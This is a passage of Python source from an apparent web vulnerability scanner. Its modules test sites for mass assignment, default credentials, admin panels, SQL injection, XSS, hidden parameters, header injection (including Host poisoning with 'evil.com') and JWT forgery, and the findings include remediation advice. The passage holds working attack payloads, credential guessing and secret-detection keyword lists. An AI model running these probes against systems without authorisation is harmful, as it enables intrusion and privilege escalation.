        # For each privileged field, send it alongside the normal data
        for field_name, field_values in PRIVILEGED_FIELDS:
            if endpoint in found:
                break
            # Skip if field already exists (might be legitimately there)
            if field_name in existing:
                current_val = existing[field_name]
                # Check if it's already a privileged value
                if current_val in field_values or current_val is True:
                    continue

            for test_value in field_values[:2]:  # Test first 2 values per field
                if endpoint in found:
                    break

                # Build payload: normal fields + privileged field
                payload = {k: v for k, v in existing.items()
                          if k not in ["id", "created_at", "updated_at", "createdAt", "updatedAt"]}
                payload[field_name] = test_value

                try:
                    # Try PATCH first (less destructive than PUT)
                    resp = safe_request("PATCH", endpoint, json=payload,
                        headers=put_headers, timeout=8, verify=False)

                    if resp.status_code in [200, 201, 204]:
                        # Check if the server echoed back our privileged field
                        try:
                            resp_data = json.loads(resp.text)
                            if isinstance(resp_data, dict) and "data" in resp_data:
                                resp_data = resp_data["data"]
                            if isinstance(resp_data, dict):
                                actual_val = resp_data.get(field_name)
                                if actual_val == test_value or actual_val is True:
                                    # Server accepted and reflected the privileged field!
                                    if endpoint not in found:
                                        found.add(endpoint)
                                        p = urlparse(endpoint)
                                        return (endpoint, field_name, test_value,
                                                actual_val, p.path)
                        except json.JSONDecodeError:
                            # Server accepted but response isn't JSON — still suspicious
                            if resp.status_code == 200:
                                pass  # Can't confirm, skip
                except Exception:
                    pass
        return None

    log(f"Mass Assignment: testing {len(update_endpoints)} endpoints for privileged field injection...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(THREADS, 5)) as ex:
        futures = {ex.submit(_test_mass_assign, ep): ep for ep in update_endpoints}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                endpoint, field, sent_val, received_val, path = r
                add_finding(
                    "Mass Assignment — Privilege Escalation", "critical",
                    path,
                    f"Server accepted privileged field '{field}'='{sent_val}' in request body. "
                    f"Response confirmed field was set to: '{received_val}'. "
                    f"Attacker can escalate privileges or manipulate protected attributes.",
                    f"PATCH {path} body={{..., \"{field}\": \"{sent_val}\"}} → "
                    f"Response: \"{field}\": \"{received_val}\"",
                    f"Implement explicit field whitelisting (strong parameters / DTO pattern). "
                    f"Never auto-map request body fields to model attributes. "
                    f"The '{field}' field must only be settable by server-side logic."
                )


# ═══════════════════════════════════════════════════════════════
# MODULE 12: BROKEN AUTH — top 50 creds, deduped admin panels
# ═══════════════════════════════════════════════════════════════
def test_auth(target, urls, headers):
    parsed = urlparse(target)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    login_paths = ["/login", "/signin", "/admin", "/admin/login",
                   "/user/login", "/account/login", "/wp-login.php",
                   "/login.php", "/auth/login", "/users/sign_in",
                   "/api/login", "/api/auth", "/api/v1/login"]

    login_url = None
    for url in urls:
        if any(p in url.lower() for p in ["login", "signin"]):
            login_url = url
            break
    if not login_url:
        for path in login_paths:
            try:
                resp = safe_get(base + path, headers=headers, timeout=6, verify=False)
                if resp.status_code == 200 and any(
                        kw in resp.text.lower() for kw in ["password", "username", "login"]):
                    login_url = base + path
                    break
            except Exception:
                pass

    if login_url:
        log(f"Testing brute force at {login_url}...")
        blocked = False
        test_creds = [
            {"username": "admin",  "password": "wrongpass_sentrix_1"},
            {"username": "admin",  "password": "wrongpass_sentrix_2"},
            {"username": "admin",  "password": "wrongpass_sentrix_3"},
            {"username": "test",   "password": "wrongpass_sentrix_4"},
            {"username": "root",   "password": "wrongpass_sentrix_5"},
        ]
        for c in test_creds:
            try:
                resp = safe_post(login_url, data=c, headers=headers, timeout=6, verify=False)
                if resp.status_code in [429, 403] or any(
                        w in resp.text.lower() for w in ["locked","blocked","captcha","too many","rate limit"]):
                    blocked = True
                    log("Brute force protection detected ✓", "success")
                    break
                time.sleep(0.3)
            except Exception:
                pass

        if not blocked:
            add_finding("Missing Brute Force Protection", "medium", login_url,
                "Login accepts unlimited failed attempts. Automated password attacks possible.",
                "5 failed attempts — no lockout or rate limit detected",
                "Implement account lockout after 5 attempts. Add CAPTCHA. Rate limit by IP.")

        # Test top 50 default credentials
        for username, password in DEFAULT_CREDENTIALS:
            try:
                resp = safe_post(login_url,
                    data={"username": username, "password": password},
                    headers=headers, timeout=6, verify=False, allow_redirects=True)
                if resp.status_code == 200 and any(
                        kw in resp.text.lower() for kw in
                        ["dashboard","welcome","logout","profile","account","home"]):
                    add_finding("Default Credentials Accepted", "critical", login_url,
                        f"Login succeeded with default credentials: {username}:{password}.",
                        f"POST {login_url} username={username}&password={password} -> login page keywords found",
                        "Change all default credentials. Enforce strong password policy.")
                    break
            except Exception:
                pass

    # Deduped admin panel check — /admin and /admin/ = 1 finding
    # SPA catch-all detection: probe a random path to get baseline size
    admin_paths = ["/admin", "/administrator", "/phpmyadmin",
                   "/wp-admin", "/manager", "/control", "/cpanel",
                   "/dashboard", "/backend", "/manage"]
    found_admin = set()

    # Get SPA baseline — if all unknown paths return 200 with same size, skip admin checks
    try:
        _spa_probe = safe_get(base + "/sentrix_admin_probe_xyz987",
                              headers=headers, timeout=6, verify=False)
        _spa_size  = len(_spa_probe.text)
        _spa_is_catchall = (_spa_probe.status_code == 200 and
                            "html" in _spa_probe.headers.get("content-type","").lower() and
                            _spa_size > 1000)
    except Exception:
        _spa_size = -1
        _spa_is_catchall = False

    for path in admin_paths:
        norm_path = path.rstrip("/")
        if norm_path in found_admin:
            continue
        try:
            resp = safe_get(base + path, headers=headers, timeout=6, verify=False)

            # Skip if SPA is returning catch-all (same size ±5% as random path probe)
            if _spa_is_catchall and _spa_size > 0:
                ratio = len(resp.text) / _spa_size
                if 0.95 <= ratio <= 1.05:
                    continue  # SPA catch-all — not a real admin panel

            # Must be 200 AND contain real admin keywords that differ from homepage
            if resp.status_code == 200 and any(
                    kw in resp.text.lower() for kw in
                    ["admin panel", "administration", "admin login",
                     "phpmyadmin", "site administration", "control panel",
                     "username", "administrator"]):
                # Extra check: must NOT be same content as homepage
                try:
                    home = safe_get(base, headers=headers, timeout=6, verify=False)
                    if abs(len(resp.text) - len(home.text)) < 200:
                        continue  # Same as homepage — catch-all
                except Exception:
                    pass
                found_admin.add(norm_path)
                add_finding("Admin Panel Publicly Accessible", "medium", path,
                    f"Admin panel at {path} reachable — auth bypass unconfirmed, verify manually.",
                    f"GET {base + path} -> HTTP 200 with admin keywords",
                    "Restrict by IP whitelist. Require MFA. Move to non-standard path.")
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
# MODULE 13: SSL/TLS
# ═══════════════════════════════════════════════════════════════
def test_ssl(target, headers):
    parsed = urlparse(target)
    if parsed.scheme == "http":
        https_available = False
        try:
            resp = safe_get("https://" + parsed.netloc, timeout=8, verify=False)
            if resp.status_code < 500:
                https_available = True
        except Exception:
            pass
        add_finding("No HTTPS — Plaintext Traffic", "high", target,
            "All traffic transmitted in plaintext. Passwords and cookies visible on the network.",
            f"Protocol: HTTP. {'HTTPS exists but not enforced.' if https_available else 'HTTPS unavailable.'}",
            "Install TLS certificate (free from Let's Encrypt). Force HTTPS. Set HSTS header.")



# ═══════════════════════════════════════════════════════════════
# ROUND 2 MODULE A: JSON/API BODY TESTING
# Tests POST /api endpoints with JSON payloads for SQLi + XSS
# Modern apps use JSON APIs — form testing misses these entirely
# ═══════════════════════════════════════════════════════════════
def test_json_api(target, urls, headers):
    found_apis = set()
    parsed     = urlparse(target)
    base       = f"{parsed.scheme}://{parsed.netloc}"

    # Collect API-looking endpoints from crawled URLs
    api_urls = [u for u in urls if any(
        kw in u.lower() for kw in ["/api/", "/v1/", "/v2/", "/v3/", "/rest/", "/json", "/graphql"]
    )]

    # Also probe common API paths
    for path in COMMON_API_PATHS:
        api_urls.append(base + path)

    log(f"JSON API: probing {len(api_urls)} endpoints...")

    sqli_payloads_json = ["'", "''", "1 OR 1=1", "1' OR '1'='1", '" OR "1"="1']
    xss_payloads_json  = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
                          '"><script>alert(1)</script>']
    probe = "JSONPROBE" + ''.join(random.choices(string.ascii_uppercase, k=5))

    def _test_json_endpoint(api_url):
        if api_url in found_apis:
            return

        h = headers.copy()
        h["Content-Type"] = "application/json"
        h["Accept"]       = "application/json"

        # First: probe endpoint to see if it exists + get structure
        try:
            resp = safe_get(api_url, headers=h, timeout=8, verify=False)
            if resp.status_code in [404, 410]:
                return
            ct = resp.headers.get("content-type", "")
            is_json = "json" in ct or resp.text.strip().startswith(("{", "["))
        except Exception:
            return

        # Common JSON body shapes to test
        test_bodies = [
            {"id": 1},
            {"user_id": 1},
            {"username": "test", "password": "test"},
            {"email": "test@test.com"},
            {"query": "test"},
            {"search": "test"},
            {"name": "test"},
            {"token": "test"},
        ]

        # SQLi in JSON values
        for body in test_bodies[:4]:
            for field in list(body.keys()):
                for payload in sqli_payloads_json:
                    test_body = body.copy()
                    test_body[field] = payload
                    try:
                        resp = safe_post(api_url, json=test_body, headers=h,
                            timeout=8, verify=False)
                        body_lower = resp.text.lower()
                        for err in SQL_ERRORS:
                            if err in body_lower and api_url not in found_apis:
                                found_apis.add(api_url)
                                p = urlparse(api_url)
                                add_finding("SQL Injection in JSON API", "critical",
                                    p.path,
                                    f"SQLi in JSON field '{field}'. DB error in response — JSON API not sanitizing inputs.",
                                    f"POST {p.path} body={json.dumps(test_body)} -> DB error: '{err}'",
                                    "Use parameterized queries for all JSON input fields.")
                                return
                    except Exception:
                        pass

        # XSS in JSON values
        for body in test_bodies[:3]:
            for field in list(body.keys()):
                for payload in xss_payloads_json:
                    test_body = body.copy()
                    test_body[field] = payload
                    try:
                        resp = safe_post(api_url, json=test_body, headers=h,
                            timeout=8, verify=False)
                        if payload in resp.text and api_url not in found_apis:
                            found_apis.add(api_url)
                            p = urlparse(api_url)
                            add_finding("XSS in JSON API", "high", p.path,
                                f"XSS in JSON field '{field}' — payload reflected from API response.",
                                f"POST {p.path} body={json.dumps(test_body)} -> payload in response",
                                "Encode all output. Set Content-Type: application/json strictly.")
                            return
                    except Exception:
                        pass

        # IDOR in JSON — enumerate id field
        for body in test_bodies[:2]:
            if "id" in body or "user_id" in body:
                field = "id" if "id" in body else "user_id"
                try:
                    body1 = body.copy(); body1[field] = 1
                    body2 = body.copy(); body2[field] = 2
                    r1 = safe_post(api_url, json=body1, headers=h, timeout=8, verify=False)
                    r2 = safe_post(api_url, json=body2, headers=h, timeout=8, verify=False)
                    diff = abs(len(r1.text) - len(r2.text))
                    if (r1.status_code == 200 and r2.status_code == 200
                            and diff > 50 and api_url not in found_apis):
                        found_apis.add(api_url)
                        p = urlparse(api_url)
                        add_finding("IDOR in JSON API", "high", p.path,
                            f"IDOR in JSON field '{field}' — different data returned for id=1 vs id=2.",
                            f"POST {p.path} {{'{field}':1}} ({len(r1.text)}b) vs {{'{field}':2}} ({len(r2.text)}b) — {diff}b diff",
                            "Verify resource ownership server-side. Never trust client-supplied IDs.")
                        return
                except Exception:
                    pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        ex.map(_test_json_endpoint, api_urls[:30])


# ═══════════════════════════════════════════════════════════════
# ROUND 2 MODULE B: HIDDEN PARAMETER DISCOVERY
#
# FALSE POSITIVE PREVENTION — requires CONCRETE evidence:
#
#   Rule 1: Response must contain debug/error/admin KEYWORDS
#            not just be a different size
#   Rule 2: Keywords must NOT be in baseline response
#            (already there before injection)
#   Rule 3: Content-Type must change (e.g. → application/json)
#            OR status code must change (e.g. 403→200)
#            OR specific high-value keywords appear
#   Rule 4: Confirmation — test param twice, both times
#            must show the same behavior
#
#   WILL NOT fire for: size difference alone, minor HTML changes,
#   dynamic content, session tokens, timestamps
# ═══════════════════════════════════════════════════════════════

# Keywords that PROVE a hidden param is doing something real
HIDDEN_PARAM_EVIDENCE = {
    # Debug mode activated
    "debug_keywords": [
        "debug mode", "debug=true", "debug enabled",
        "stack trace", "traceback", "at line ",
        "exception in", "unhandled exception",
        "sql error", "mysql error", "ora-", "mssql",
        "syntax error", "parse error",
        "undefined variable", "undefined index",
        "warning:", "notice:", "fatal error",
        "internal server", "application error",
        "asp.net is configured", "detailed error",
        "server error in", "iis detailed errors",
    ],
    # Sensitive data exposed
    "sensitive_keywords": [
        "password", "passwd", "secret", "api_key", "apikey",
        "private_key", "access_token", "bearer ",
        "db_host", "db_pass", "db_user", "database_url",
        "smtp_pass", "aws_secret", "aws_access",
        "BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH",
    ],
    # Admin/internal content appeared
    "admin_keywords": [
        "admin panel", "administration", "admin dashboard",
        "management console", "internal only",
        "debug console", "phpinfo()", "server info",
        "environment variables", "config dump",
    ],
    # Format changed to structured data
    "format_keywords": [
        '{"', '[{"', '"error":', '"debug":', '"stack":',
        '"trace":', '"config":', '"env":', '"version":',
        '<?xml', '<config>', '<debug>',
    ],
}

def test_hidden_params(target, urls, params_map, headers):
    found_params = set()

    # Only test the MOST interesting paths — not every crawled URL
    # Priority: homepage, login, admin, api endpoints
    priority_paths = set()
    test_urls = []

    for url in urls:
        p = urlparse(url).path.lower()
        # Skip login/register variants — they're all the same page
        is_priority = any(kw in p for kw in [
            "/admin", "/api", "/debug", "/config",
            "/internal", "/manage", "/dashboard",
        ])
        is_basic = p in ["/", "/index", "/default.asp",
                         "/index.php", "/index.html", "/home"]
        if (is_priority or is_basic) and p not in priority_paths:
            priority_paths.add(p)
            test_urls.append(url)

    # Always include homepage
    if not test_urls:
        test_urls = [target]

    # Limit to 5 most interesting pages max
    test_urls = test_urls[:5]

    # Only test high-value params — not ALL 81
    HIGH_VALUE_PARAMS = [
        ("debug",       ["true", "1"]),
        ("test",        ["true", "1"]),
        ("dev",         ["true", "1"]),
        ("admin",       ["true", "1"]),
        ("verbose",     ["true", "1", "3"]),
        ("trace",       ["true", "1"]),
        ("format",      ["json", "xml", "debug", "raw"]),
        ("output",      ["json", "xml", "debug", "raw"]),
        ("mode",        ["debug", "test", "dev", "admin"]),
        ("version",     ["2", "dev", "beta"]),
        ("source",      ["true", "1", "raw"]),
        ("export",      ["true", "json", "xml"]),
        ("internal",    ["true", "1"]),
        ("staging",     ["true", "1"]),
        ("preview",     ["true", "1"]),
    ]

    all_evidence_keywords = (
        HIDDEN_PARAM_EVIDENCE["debug_keywords"] +
        HIDDEN_PARAM_EVIDENCE["sensitive_keywords"] +
        HIDDEN_PARAM_EVIDENCE["admin_keywords"] +
        HIDDEN_PARAM_EVIDENCE["format_keywords"]
    )

    log(f"Hidden params: testing {len(HIGH_VALUE_PARAMS)} high-value params on {len(test_urls)} priority paths...")

    def _test_hidden_param(args):
        url, param, values = args
        p_key = f"{urlparse(url).path}:{param}"
        if p_key in found_params:
            return None

        parsed = urlparse(url)
        base_qs = parse_qs(parsed.query)

        # Baseline — record keywords already present
        try:
            base_resp = safe_get(url, headers=headers, timeout=8, verify=False)
            base_text_lower = base_resp.text.lower()
            base_ct = base_resp.headers.get("content-type", "")
            base_status = base_resp.status_code
        except Exception:
            return None

        for val in values:
            if p_key in found_params:
                return None

            tp = {k: v[0] for k, v in base_qs.items()}
            tp[param] = val
            test_url = urlunparse(parsed._replace(query=urlencode(tp)))

            try:
                resp = safe_get(test_url, headers=headers, timeout=8, verify=False)
                resp_lower = resp.text.lower()
                resp_ct = resp.headers.get("content-type", "")

                # ── Check 1: Keyword evidence ──────────────────
                new_keywords = [
                    kw for kw in all_evidence_keywords
                    if kw.lower() in resp_lower
                    and kw.lower() not in base_text_lower
                ]

                # ── Check 2: Content-Type changed ──────────────
                ct_changed = (
                    "json" in resp_ct and "json" not in base_ct
                ) or (
                    "xml" in resp_ct and "xml" not in base_ct
                )

                # ── Check 3: Status code changed meaningfully ──
                status_changed = (
                    base_status in [403, 401, 404] and
                    resp.status_code == 200
                )

                if not any([new_keywords, ct_changed, status_changed]):
                    continue

                # ── Confirmation: test AGAIN to rule out noise ─
                try:
                    resp2 = safe_get(test_url, headers=headers, timeout=8, verify=False)
                    resp2_lower = resp2.text.lower()

                    confirm_keywords = [
                        kw for kw in new_keywords
                        if kw.lower() in resp2_lower
                    ] if new_keywords else []

                    confirm_ct = (
                        "json" in resp2.headers.get("content-type", "") and ct_changed
                    )
                    confirm_status = (resp2.status_code == 200 and status_changed)

                    if not any([confirm_keywords, confirm_ct, confirm_status]):
                        continue  # Not reproducible — skip

                except Exception:
                    continue

                if p_key not in found_params:
                    found_params.add(p_key)

                    # Build evidence description
                    evidence_parts = []
                    if new_keywords:
                        evidence_parts.append(f"new keywords: {', '.join(new_keywords[:3])}")
                    if ct_changed:
                        evidence_parts.append(f"Content-Type: {base_ct} → {resp_ct}")
                    if status_changed:
                        evidence_parts.append(f"status: {base_status} → {resp.status_code}")

                    return (url, param, val, urlparse(url).path,
                            "; ".join(evidence_parts), resp.status_code)

            except Exception:
                pass

        return None

    tasks = [(url, param, values)
             for url in test_urls
             for param, values in HIGH_VALUE_PARAMS]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(_test_hidden_param, t): t for t in tasks}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                url, param, val, path, evidence, status = r
                add_finding(
                    "Hidden Parameter Discovered", "medium",
                    f"{path}?{param}={val}",
                    f"Hidden parameter '{param}={val}' triggers observable server behavior. Evidence: {evidence}. May expose debug info, admin functionality, or bypass access controls.",
                    f"GET {path}?{param}={val} → {status} — {evidence}",
                    "Remove debug/admin parameters from production. Use feature flags with server-side auth checks only."
                )


# ═══════════════════════════════════════════════════════════════
# ROUND 2 MODULE C: HEADER INJECTION TESTING
#
# FALSE POSITIVE PREVENTION — each header type has its own
# specific exploitation proof requirement:
#
#   X-Forwarded-For / X-Real-IP / True-Client-IP
#     → MUST cause 403/401 → 200 status change (real IP bypass)
#     → Reflection alone is NOT evidence (many servers log/echo headers)
#
#   Host / X-Forwarded-Host
#     → Injected value MUST appear in href/src/action links
#       in the response body (real poisoning = links point to evil.com)
#     → Reflection in plain text is NOT enough
#
#   X-Original-URL / X-Rewrite-URL / X-Override-URL
#     → MUST cause a DIFFERENT page to load vs baseline
#       (content change >500 bytes OR different status code)
#     → Must be confirmed with a second unique canary value
#
#   Origin → handled by test_cors() — removed from here
# ═══════════════════════════════════════════════════════════════
def test_header_injection(target, urls, headers):
    found_headers = set()
    parsed = urlparse(target)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    log(f"Header injection: testing {len(HEADER_INJECTION_TESTS)} header types...")

    # ── Test 1: IP Spoofing Headers ──────────────────────────────────────
    # Real bypass = server was blocking us (403/401) and now lets us in (200)
    # We look for 403/401 pages first, then test if spoofed IP unlocks them
    def _test_ip_bypass(url, header_name, spoof_value):
        path = urlparse(url).path or "/"
        key  = f"{path}:{header_name}"
        if key in found_headers:
            return None
        try:
            base_resp = safe_get(url, headers=headers, timeout=8, verify=False)
            # Only meaningful if this endpoint is actually restricted
            if base_resp.status_code not in (401, 403):
                return None

            injected = headers.copy()
            injected[header_name] = spoof_value
            resp = safe_get(url, headers=injected, timeout=8, verify=False)

            # Real bypass: was blocked, now accessible
            if resp.status_code == 200 and len(resp.text) > 200:
                # Confirm with second request using different IP to rule out timing
                injected2 = headers.copy()
                injected2[header_name] = "10.0.0.99"
                resp2 = safe_get(url, headers=injected2, timeout=8, verify=False)
                if resp2.status_code == 200:
                    found_headers.add(key)
                    return (header_name, spoof_value, path,
                            f"HTTP {base_resp.status_code}→{resp.status_code} — "
                            f"IP restriction bypassed with {header_name}: {spoof_value}",
                            "high")
        except Exception:
            pass
        return None

    # ── Test 2: Host Header Injection ────────────────────────────────────
    # Real poisoning = injected hostname appears inside href/src/action
    # attributes in the response — means generated links are poisoned
    def _test_host_injection(url, header_name, evil_host):
        path = urlparse(url).path or "/"
        key  = f"{path}:{header_name}"
        if key in found_headers:
            return None
        try:
            base_resp = safe_get(url, headers=headers, timeout=8, verify=False)

            injected = headers.copy()
            injected[header_name] = evil_host

            resp = safe_get(url, headers=injected, timeout=8, verify=False)

            # Evil host must appear INSIDE an HTML attribute (href, src, action)
            # This proves the server uses the Host header to build URLs
            link_patterns = [
                f'href="http://{evil_host}',
                f'href="https://{evil_host}',
                f'src="http://{evil_host}',
                f'src="https://{evil_host}',
                f'action="http://{evil_host}',
                f'action="https://{evil_host}',
                f'href="//{evil_host}',
                f'src="//{evil_host}',
                # Also check for password reset links
                f'{evil_host}/reset',
                f'{evil_host}/password',
                f'{evil_host}/confirm',
            ]

            poisoned = any(p.lower() in resp.text.lower() for p in link_patterns)

            if poisoned and key not in found_headers:
                found_headers.add(key)
                # Find the actual poisoned snippet for evidence
                snippet = ""
                for p in link_patterns:
                    idx = resp.text.lower().find(p.lower())
                    if idx != -1:
                        snippet = resp.text[max(0,idx-20):idx+80].strip()
                        break
                return (header_name, evil_host, path,
                        f"{header_name} poisoning confirmed — injected host appears "
                        f"in generated links. Snippet: ...{snippet}...",
                        "high")
        except Exception:
            pass
        return None

    # ── Test 3: URL Override Headers ─────────────────────────────────────
    # Real override = server serves DIFFERENT content for overridden path
    # We use a canary path and verify the response actually changed
    def _test_url_override(url, header_name, override_path):
        path = urlparse(url).path or "/"
        key  = f"{path}:{header_name}:{override_path}"
        if key in found_headers:
            return None
        try:
            # Baseline
            base_resp = safe_get(url, headers=headers, timeout=8, verify=False)
            base_len  = len(base_resp.text)
            base_status = base_resp.status_code

            # Inject override header
            injected = headers.copy()
            injected[header_name] = override_path
            resp = safe_get(url, headers=injected, timeout=8, verify=False)

            content_diff = abs(len(resp.text) - base_len)
            status_changed = (resp.status_code != base_status)

            # Must have significant content change OR status change
            # AND the change must be substantial (not just noise)
            if not (status_changed or content_diff > 800):
                return None

            # Confirm with a second unique canary path
            canary_path = "/sentrix_canary_override_xyz"
            injected2 = headers.copy()
            injected2[header_name] = canary_path
            resp2 = safe_get(url, headers=injected2, timeout=8, verify=False)
            canary_diff = abs(len(resp2.text) - base_len)

            # If canary also changes response — server is routing based on header
            if canary_diff > 200 or resp2.status_code != base_status:
                if key not in found_headers:
                    found_headers.add(key)
                    return (header_name, override_path, path,
                            f"URL routing overridden via {header_name}. "
                            f"Baseline: HTTP {base_status} ({base_len}b) → "
                            f"Override: HTTP {resp.status_code} ({len(resp.text)}b). "
                            f"Diff: {content_diff}b",
                            "high" if resp.status_code == 200 and base_status in (403,404) else "medium")
        except Exception:
            pass
        return None

    # ── Build targeted test URLs ─────────────────────────────────────────
    # IP bypass: look for restricted pages (will return 403/401 naturally)
    restricted_urls = [target]
    for url in urls:
        if any(kw in url.lower() for kw in ["admin", "login", "private",
                                              "secure", "internal", "manage"]):
            restricted_urls.append(url)
    restricted_urls = list(set(restricted_urls))[:8]

    # Host injection: test on pages that generate links (homepage, login, reset)
    link_urls = [target]
    for url in urls:
        if any(kw in url.lower() for kw in ["login", "reset", "password",
                                              "forgot", "register", "signup"]):
            link_urls.append(url)
    link_urls = list(set(link_urls))[:5]

    # URL override: test on homepage + any 403 pages
    override_urls = [target]
    for url in urls:
        if any(kw in url.lower() for kw in ["admin", "internal", "private"]):
            override_urls.append(url)
    override_urls = list(set(override_urls))[:5]

    # ── Run all three test categories in parallel ─────────────────────────
    IP_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Client-IP",
                  "X-Remote-IP", "X-Remote-Addr", "True-Client-IP",
                  "CF-Connecting-IP"]
    HOST_HEADERS = ["Host", "X-Forwarded-Host"]
    OVERRIDE_HEADERS = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL"]
    OVERRIDE_PATHS = ["/admin", "/internal", "/.env", "/debug", "/config"]

    tasks = []

    # IP bypass tasks — only on restricted URLs
    for url in restricted_urls:
        for h in IP_HEADERS:
            tasks.append(("ip", url, h, "127.0.0.1"))

    # Host injection tasks
    for url in link_urls:
        for h in HOST_HEADERS:
            tasks.append(("host", url, h, "evil.com"))

    # URL override tasks
    for url in override_urls:
        for h in OVERRIDE_HEADERS:
            for p in OVERRIDE_PATHS[:2]:
                tasks.append(("override", url, h, p))

    def _dispatch(task):
        kind = task[0]
        if kind == "ip":
            _, url, h, val = task
            return _test_ip_bypass(url, h, val)
        elif kind == "host":
            _, url, h, val = task
            return _test_host_injection(url, h, val)
        elif kind == "override":
            _, url, h, val = task
            return _test_url_override(url, h, val)
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(_dispatch, t): t for t in tasks}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                h_name, h_val, path, evidence, severity = r

                # Ensure path is never blank
                if not path or path == "/":
                    path = urlparse(target).path or "/"

                vuln_map = {
                    "X-Forwarded-For":  ("IP Restriction Bypass via X-Forwarded-For",
                                         "IP-based access control bypassed."),
                    "X-Real-IP":        ("IP Restriction Bypass via X-Real-IP",
                                         "IP-based access control bypassed."),
                    "X-Client-IP":      ("IP Restriction Bypass via X-Client-IP",
                                         "IP-based access control bypassed."),
                    "X-Remote-IP":      ("IP Restriction Bypass via X-Remote-IP",
                                         "IP-based access control bypassed."),
                    "X-Remote-Addr":    ("IP Restriction Bypass via X-Remote-Addr",
                                         "IP-based access control bypassed."),
                    "True-Client-IP":   ("IP Restriction Bypass via True-Client-IP",
                                         "IP-based access control bypassed."),
                    "CF-Connecting-IP": ("IP Restriction Bypass via CF-Connecting-IP",
                                         "IP-based access control bypassed."),
                    "Host":             ("Host Header Injection",
                                         "Server uses Host header to generate links — "
                                         "enables password reset poisoning and cache poisoning."),
                    "X-Forwarded-Host": ("Host Header Injection via X-Forwarded-Host",
                                         "Proxy header used to generate links — "
                                         "enables cache poisoning."),
                    "X-Original-URL":   ("URL Override via X-Original-URL",
                                         "Backend routing controlled by header — "
                                         "may access forbidden paths."),
                    "X-Rewrite-URL":    ("URL Override via X-Rewrite-URL",
                                         "Backend routing controlled by header."),
                    "X-Override-URL":   ("URL Override via X-Override-URL",
                                         "Backend routing controlled by header."),
                }
                name, desc = vuln_map.get(h_name, (f"{h_name} Header Injection",
                    f"Server behavior changed when {h_name}: {h_val} injected."))

                add_finding(name, severity, path,
                    f"{desc} Evidence: {evidence}",
                    f"GET {path} — Header: {h_name}: {h_val} → {evidence}",
                    f"Validate and ignore untrusted {h_name} headers. "
                    f"Use server-side config for routing, not client-supplied headers.")




# ═══════════════════════════════════════════════════════════════
# ROUND 3 MODULE A: JWT TESTING
# Attacks: none algorithm, algorithm confusion (RS256→HS256), weak secret
# ═══════════════════════════════════════════════════════════════
def test_jwt(target, urls, headers, seed_token=""):
    import hmac
    import hashlib

    log("JWT: scanning for tokens in responses and cookies...")

    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
    found_tokens = {}

    # Use the token extracted at login — most reliable source
    if seed_token and jwt_re.match(seed_token):
        found_tokens[seed_token] = target
        log(f"JWT: using authenticated token from login for attack testing", "info")

    def _collect_tokens(url):
        """Collect JWT tokens from response bodies and Set-Cookie headers"""
        try:
            resp = safe_get(url, headers=headers, timeout=8, verify=False)
            tokens = jwt_re.findall(resp.text)
            for ck in resp.headers.get("set-cookie", "").split(";"):
                tokens += jwt_re.findall(ck)
            # Also check Authorization header echoes
            for header_val in resp.headers.values():
                tokens += jwt_re.findall(header_val)
            for tok in set(tokens):
                found_tokens[tok] = url
        except Exception:
            pass

    def _try_login_for_jwt(url):
        """POST common test credentials to login endpoints to receive JWT"""
        post_headers = headers.copy()
        post_headers["Content-Type"] = "application/json"
        test_logins = [
            {"email": "test@test.com",  "password": "test"},
            {"username": "admin",       "password": "admin"},
            {"email": "admin@admin.com","password": "admin"},
            {"user": "test",            "password": "test"},
        ]
        for creds in test_logins:
            try:
                resp = safe_post(url, headers=post_headers,
                                 data=json.dumps(creds), timeout=8, verify=False)
                tokens = jwt_re.findall(resp.text)
                for ck in resp.headers.get("set-cookie", "").split(";"):
                    tokens += jwt_re.findall(ck)
                # Check Authorization header in response
                auth_header = resp.headers.get("authorization", "")
                tokens += jwt_re.findall(auth_header)
                if tokens:
                    for tok in set(tokens):
                        found_tokens[tok] = url
                    return  # Got tokens, stop trying
            except Exception:
                continue

    # Also try login/api endpoints likely to return JWTs
    jwt_target_urls = list(set(
        [target] + [u for u in urls if any(kw in u.lower() for kw in
         ["login", "auth", "token", "jwt", "api", "session", "user"])]
    ))[:15]

    for url in jwt_target_urls:
        _collect_tokens(url)

    # If no tokens yet, try POSTing to login endpoints
    if not found_tokens:
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        login_endpoints = [
            base + "/api/Users/login",
            base + "/api/auth/login",
            base + "/api/login",
            base + "/auth/login",
            base + "/login",
            base + "/api/v1/login",
            base + "/api/token",
        ]
        for ep in login_endpoints:
            _try_login_for_jwt(ep)
            if found_tokens:
                break

    if not found_tokens:
        log("JWT: no tokens found in responses — skipping JWT attacks", "muted")
        return

    log(f"JWT: found {len(found_tokens)} token(s) — testing attacks...", "info")

    def _decode_part(part):
        """Base64url decode without padding"""
        part += "=" * (-len(part) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(part))
        except Exception:
            return {}

    def _b64url(data):
        if isinstance(data, dict):
            data = json.dumps(data, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _send_jwt(url, token, attack_name, evidence):
        """Send a forged JWT and check if it's accepted (200 response with auth-looking content)"""
        try:
            test_headers = headers.copy()
            test_headers["Authorization"] = f"Bearer {token}"
            resp = safe_get(url, headers=test_headers, timeout=8, verify=False)
            # Accepted = 200 with actual content (not error page)
            if resp.status_code == 200 and len(resp.text) > 100:
                error_words = ["invalid", "expired", "unauthorized", "signature", "forbidden", "bad token"]
                if not any(w in resp.text.lower() for w in error_words):
                    return (url, attack_name, evidence, resp.status_code)
        except Exception:
            pass
        return None

